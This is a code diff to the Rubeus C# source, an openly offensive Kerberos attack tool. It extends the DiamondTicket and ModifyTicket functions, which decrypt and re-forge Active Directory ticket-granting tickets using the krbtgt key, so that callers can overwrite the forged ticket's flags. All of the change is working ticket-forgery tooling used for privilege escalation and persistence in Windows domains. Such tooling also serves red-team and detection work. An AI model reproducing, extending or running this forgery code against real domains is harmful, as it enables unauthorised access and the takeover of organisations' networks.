@@ -899,21 +899,21 @@ namespace Rubeus
             }
         }
 
-        public static byte[] DiamondTicket(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool opsec, bool ldap, bool ptt, string ldapuser = "", string ldappassword = "", string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
+        public static byte[] DiamondTicket(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool opsec, bool ldap, bool ptt, string ldapuser = "", string ldappassword = "", string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "", Interop.TicketFlags ticketFlags = Interop.TicketFlags.empty)
         {
             byte[] tgtBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, luid, false, opsec);
 
-            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ldap, ldapuser, ldappassword, domainController, domain, ptt, luid, ticketUser, groups, ticketUserId, sids);
+            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ldap, ldapuser, ldappassword, domainController, domain, ptt, luid, ticketUser, groups, ticketUserId, sids, ticketFlags: ticketFlags);
         }
 
-        public static byte[] DiamondTicket(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool opsec, bool ldap, bool ptt, string ldapuser = "", string ldappassword = "", string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
+        public static byte[] DiamondTicket(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool opsec, bool ldap, bool ptt, string ldapuser = "", string ldappassword = "", string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "", Interop.TicketFlags ticketFlags = Interop.TicketFlags.empty)
         {
             byte[] tgtBytes = Ask.TGT(userName, domain, certFile, certPass, etype, null, false, domainController);
 
-            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ldap, ldapuser, ldappassword, domainController, domain, ptt, luid, ticketUser, groups, ticketUserId, sids);
+            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ldap, ldapuser, ldappassword, domainController, domain, ptt, luid, ticketUser, groups, ticketUserId, sids, ticketFlags: ticketFlags);
         }
 
-        public static byte[] ModifyTicket(KRB_CRED kirbi, string serviceKey = "", string krbKey = "", string outfile = "", bool ldap = false, string ldapuser = "", string ldappassword = "", string domainController = "", string domain = "", bool ptt = false, LUID luid = new LUID(), string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "",byte[] sessionKey = null, Interop.KERB_ETYPE sessionKeyEtype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
+        public static byte[] ModifyTicket(KRB_CRED kirbi, string serviceKey = "", string krbKey = "", string outfile = "", bool ldap = false, string ldapuser = "", string ldappassword = "", string domainController = "", string domain = "", bool ptt = false, LUID luid = new LUID(), string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "",byte[] sessionKey = null, Interop.KERB_ETYPE sessionKeyEtype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1, Interop.TicketFlags ticketFlags = Interop.TicketFlags.empty)
         {
             Console.WriteLine();
             if (String.IsNullOrEmpty(krbKey))
@@ -944,6 +944,13 @@ namespace Rubeus
                 {
                     Console.WriteLine("[X] Unable to decrypt ticket or get PAC!");
                     return null;
+                }
+
+                // issue #195: override the (otherwise preserved) ticket flags when /flags was supplied
+                if (ticketFlags != Interop.TicketFlags.empty)
+                {
+                    Console.WriteLine("[*] Setting ticket flags to: {0}", ticketFlags);
+                    decryptedEncTicket.flags = ticketFlags;
                 }
 
                 var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
